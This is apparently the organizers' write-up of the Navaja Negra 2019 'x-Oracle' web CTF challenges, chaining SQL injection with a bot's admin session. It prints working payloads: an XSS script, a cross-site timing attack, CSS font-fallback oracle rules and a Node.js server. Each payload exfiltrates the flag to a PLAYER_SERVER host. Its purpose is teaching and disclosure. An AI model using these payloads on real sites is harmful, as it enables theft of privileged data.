# Writeup x-Oracle Challenges (Navaja Negra 2019 CTF)

> __Preface:__ Navaja Negra is a local security conference celebrated every year in Albacete (Spain). Traditionally we have been organizing small CTFs for it. These tasks are a series of web challenges for this year: https://nn9ed.ka0labs.org/.

The challenges are based on a vanilla SQL injection that must be exploited by a bot with admin role. The [source code](https://gist.github.com/cgvwzq/c78aa5fc228225a2779745f2705eeab5) is provided, so it is easy to spot the SQLi.

Complete source code: https://github.com/cgvwzq/ctf_tasks/tree/master/nn9ed

## x-Oracle-v0

The first challenge can be solved by chaining the SQL injection with a Blind XSS. The CSP configuration allows `unsafe-inline` and `img-src *`, so it is easy to force the bot to exploit the SQL injection and exfiltrate the flag to an external server:

```html
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```

Easy Peasy, here's your flag: `nn9ed{y0u_b3tt3r_warmUp_your_w3b_j4king_sk1lls}`

## x-Oracle-v1

This challenges includes a patch for the previous bug:

```
< res.setHeader('Content-Security-Policy', "default-src 'self' 'unsafe-inline'; img-src *; style-src *; font-src *");
---
> res.setHeader('Content-Security-Policy', "default-src 'self'; img-src *; style-src * 'unsafe-inline'; font-src *");
```

With this stricter CSP we cannot inject <script> tags or run JavaScript, so things get a bit more complicated. However, we can still try to exploit a time-based SQLi.

While there are many ways to solve this challenge (any solution for x-Oracle-v2 would also work here), our intended solution exploited a cross-site timing attack.

First, we need to redirect the bot to a website controlled by us ---easily done with `<meta http-equiv=refresh>`--- because this action is not affected by the CSP policy. From there we can use any method for measuring the loading time of a cross-origin resource.

In our case we used iframes and the onload event to extract the flag character by character. Finally we simply exfiltrate the flag via an `<img>` request.

```html
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
	x = escape(x.replace(/_/g, '\\_'));
	return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`; 
}

function gen2(x) {
	x = escape(x);
	return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) { 
	let h = performance.now();
	f.location = (end ? gen2(word) : gen(word));
	await new Promise(r => {
		g.onload = r; 
	});
	let diff = performance.now() - h;
	return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
	let prefix = 'nn9ed{';
	while (true) {
		let i = 0;
		for (i;i<alphabet.length;i++) {
			let c = alphabet[i];
			let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
			console.log(prefix, c, t);
			if (t) {
				console.log('FOUND!')
				prefix += c;
				break;
			}
		}
		if (i==alphabet.length) {
			console.log('missing chars');
			break;
		}
		let t = await query(prefix+'}', true);
		if (t) {
			prefix += '}';
			break;
		}
	}
	new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
	console.log(prefix);
}

run();
</script>
```

The flag: `nn9ed{t1ming_att4cks_ar3_th3_best_att4cks}`

## x-Oracle-v2

Now cross-site timing attacks are mitigated by SameSite cookies (this was supposed to be a huge hint for the bug in v1):

```
< cookie: { secure: false }
---
> cookie: { secure: false, sameSite: 'strict' }
```

Again, CSP only allows imgs, styles and fonts. Fonts? Yep! Fonts!

Unfortunately, SameSite cookies mean that we can not exploit cross-site timing attacks anymore ---the admin's cookie will not be send on the request.

Instead, our intended solution uses "fonts"! This summer we spend some time discussing about how to measure time purely in CSS, and after some reading, we found out that CSS font urls have a fallback mechanism that could be abused for that. This approach has several limitations, but it seemed fun enough for a CTF task :)

Specifically we are interested in `font-display`, according to the [spec](https://drafts.csswg.org/css-fonts-4/#font-display-desc):

>...[font-display] determines how a font face is displayed, based on whether and when it is downloaded and ready to use"

It supports 5 options:

* `auto`: The display policy is user-agent-defined (most cases same as `block`)
* `block`: Gives the font face a short __block period__ (3s is recommended in most cases) and an infinite __swap period__.
* `swap`: Gives the font face an extremely small __block period__ (100ms or less is recommended in most cases) and an infinite __swap period__.
* `fallback`: Gives the font face an extremely small __block period__ (100ms or less is recommended in most cases) and a short __swap period__ (3s is recommended in most cases).
* `optional`: Gives the font face an extremely small __block period__ (100ms or less is recommended in most cases) and a 0s __swap period__.

And from the moment that the user-agent tries to download a font, the font-face starts a timer that will advance through 3 periods:

* __Block period__: if the font face is not loaded, any element attempting to use it must instead render with an invisible fallback font face. If the font face successfully loads during the block period, the font face is then used normally.
* __Swap period__: if the font face is not loaded, any element attempting to use it must instead render with a fallback font face. If the font face successfully loads during the swap period, the font face is then used normally.
* __Failure period__: if the font face is not yet loaded when this period starts, it’s marked as a failed load, causing normal font fallback. Otherwise, the font face is used normally.

In practice, we can expect the following scenario:

```css
@font-face {
    font-family: Leak;
    src: url(http://url-a/), url(http://url-b);
    font-display: optional;
}
div.leak {
    font-family: Leak;
}
```

Our font will try to load the first resource, since we are using `font-display: optional`, the block period has only 100ms to load the resource. If the requests fails during this time, the fallback font will be requested; otherwise, it will skip the swap period, mark the load as failed, and fallback to the normal font.

This means that if the first request takes too long to resolve, the second request is never done. Or in other words, we have our oracle in pure CSS!

From this point, is relatively easy to implement a tree search based on the time-based SQLi:

```css
@font-face {
    font-family: Leak;
    src:url(http://x-oracle-v2.nn9ed.ka0labs.org/admin/search/x%27union%20select%20if%28flag%20regexp%20%27nn9ed%7B%5B%5C_abcdel%5D.*%7D%27,0,sleep%280.1%29%29%20from%20challenge%20where%20flag%20like%27nn9ed%7B%25%27%23), url(http://PLAYER_SERVER/leak?pre=nn9ed%7B&range=%5C_abcdel);
    font-display: optional;
    unicode-range: U+005f,U+0061,U+0062,U+0063,U+0064,U+0065,U+006c;
}

@font-face {
    font-family: Leak;
    src:url(http://x-oracle-v2.nn9ed.ka0labs.org/admin/search/x%27union%20select%20if%28flag%20regexp%20%27nn9ed%7B%5Bfghijs%5D.*%7D%27,0,sleep%280.1%29%29%20from%20challenge%20where%20flag%20like%27nn9ed%7B%25%27%23), url(http://PLAYER_SERVER/leak?pre=nn9ed%7B&range=fghijs);
    font-display: optional;
    unicode-range: U+0066,U+0067,U+0068,U+0069,U+006a,U+0073;
}
div { font-family: Leak; }
```
When the admin visits a page with the following content, it will ping back with the subset that contains the first character:

```html
<div>_abcdefghijklmnopqrstuvwxyz</div>
<style>@import url(http://PLAYER_SERVER/)</style>
```

One drawback of this injection is that it is case insensitive, so we might need to refine it, but for illustration purposes is enough.

The following PoC uses recursive CSS import (for more details see [this](https://github.com/cgvwzq/css-scrollbar-attack/), [this](https://github.com/cgvwzq/css-scrollbar-attack/), or [this](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b)) with the previous font fallback trick, to extract the flag in ~5s with a single visit of the admin:

```js
const http = require('http');
const url = require('url');
const port = 80;

const TARGET = "http://x-oraclev-2.nn9ed.ka0labs.org";
const HOSTNAME = `http://PLAYER_SERVER:${port}`;

const MAX_CON = 2;

Array.prototype.chunks = function(n) {
	let s = Math.floor(this.length / n);
    let ret = [], i;
	if (this.length <= n) {
		return this.map(e=>[e]);
	}
	for (i=0; i<s*n; i += s) {
		ret.push(this.slice(i,i+s));
    }
	for (i; i<this.length; i++) {
		ret[i%ret.length].push(this[i]);
    }
    return ret;
}

let nextResponse, pre, ranges, dic, c = 1;

const requestHandler = async (request, response) => {
    let req = url.parse(request.url, url);
    log('\treq: %s', request.url);
	response.setHeader('Access-Control-Allow-Origin','*');
    switch (req.pathname) {
        case "/css":
			pre = decodeURIComponent(req.query.pre);
			dic = decodeURIComponent(req.query.dic).split('');
			ranges = dic.chunks(MAX_CON);
			genResponse(response, pre, ranges);
            break;
		case "/next":
			console.log('delay next response');
			nextResponse = response;
			break;
		case "/leak":
			console.log(req.query.pre, req.query.range);
			if (parseInt(req.query.c) < c) {
				response.end();
				break;
			}
			if (req.query.range.length == 1) {
				pre += decodeURIComponent(req.query.range);
				ranges = dic.chunks(MAX_CON);
				c += 1;
				console.log('got char!');
			} else {
				ranges = decodeURIComponent(req.query.range).split('').chunks(MAX_CON);
			}
			if (nextResponse) {
				genResponse(nextResponse, pre, ranges);
			} else {
				console.log('shit...');
			}
            response.end();
			break;
        default:
            response.end();
    }
}

function cssEscape(i) {
	return escape(i);
}

const genResponse = (response, pre, ranges) => {
	let css = '@import url(' + HOSTNAME + '/next?' + Math.random() + ');\n\n' +
	ranges.map(e => ('@font-face { font-family: Leak;\n' +
		'src:url(' + TARGET + '/admin/search/x%27union%20select%20if%28cast%28flag%20as%20binary%29%20regexp%20%27' + cssEscape(pre) + '%5B' + cssEscape(e.join('')) + '%5D.*%7D%27,0,sleep%280.2%29%29%20from%20challenge%20where%20flag%20like%27nn9ed%7B%25%27%23), ' +
		'url(' + HOSTNAME + '/leak?pre=' + cssEscape(pre) + '&range=' + cssEscape(e.join('')) + '&c=' + c + '); font-display: optional; unicode-range: ' + e.map(x => ('U+' + ('0000'+x.charCodeAt(0).toString(16)).substr(-4))).join(','))+';}').join('\n') +
		'\n' + 'div' + ' { font-family: Leak; }';
    response.writeHead(200, { 'Content-Type': 'text/css'});
    response.write(css);
    response.end();

}

const server = http.createServer(requestHandler)

server.listen(port, (err) => {
    if (err) {
        return console.log('[-] Error: something bad happened', err);
    }
    console.log('[+] Server is listening on %d', port);
})

function log() {
    console.log.apply(console, arguments);
}
```

The code is a bit unestable ---the browsers send some requests whose reason I still need to figure out---, but if we ignore them (thanks to the `c` param), in the worst case a few retries give us the flag (in lower case): `nn9ed{css_fallback_rulez}`.

After some manual adjustment: `nn9ed{cSS_fallback_rulez}`.

Interestingly, we can do better than a binary search by splitting the alphabet in more fonts. However, this number is limited by the browser's maximum number of connections per hosts (6 in most modern browsers). Using more than that will make the browser serialize fruther requests and the timing measurements will become useless.

## Unexpected solutions

One of the best perks of organizing a CTF is to see other people resolving your tasks in a different way than you intended. And this occasion wasn't an exception :)

We were aware that some sources of contention or serialization during parsing or resource loading could be used to solve this tasks. For a 2006 example, see Jeremiah Grossman's [non-JS port scanner](https://blog.jeremiahgrossman.com/2006/11/browser-port-scanning-without.html). Only 13 years ago... Feeling old? T_T

But nevertheless we got a few very interesting submissions. All of them solving both v1 and v2 at once.

### Font `unicode-range` + Alternative text

The first solution comes from the hand of [@terjanq](https://twitter.com/terjanq), who essentially destroyed the CTF solving all the tasks in just a few hours. Kudos!

He leverages a known `unicode-range` [trick](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html) in a very smart way, to detect whether the alternate text of an `object` element has been rendered (on error) or not (on load). With that he is able to exploit an error based SQLi instead of a time-based. For more details see his [PoC](https://gist.github.com/terjanq/33bbb8828839994c848c3b76c1ac67b1).

Similarly, [Borja Martinez](https://twitter.com/Qm9yamFN) ---who heroically managed to solve the challenge at 6.20 AM--- used the `<img alt="A" src="http://victim/">` instead of `<object data="http://victim/">A</object>`.

In this case, the alternative text of the image is always rendered, but the browser only does that once the resource is resolved. By requesting a controlled resource before (time_start), and calculating the difference with the font load request (time_end), he obtains the delay of the loaded resource w/o JavaScript.

### `<img>` stalling `<meta http-equiv=refresh>`
The second person to solve the challenge was [Luan Herrera](https://twitter.com/lbherrera_), who used the fact that `<meta http-equiv=refresh>` will only take place when the previous images have finished loading.

Like Borja, he first requests a controlled resource (time_start), sets the stalling `<img>` tag, and the `<meta>` refresh tag pointing to his server to obtain the time delay.

Great work.

## Thanks for reading!
by [@cgvwzq](https://twitter.com/cgvwzq) and [@TheXC3LL](https://twitter.com/TheXC3LL)
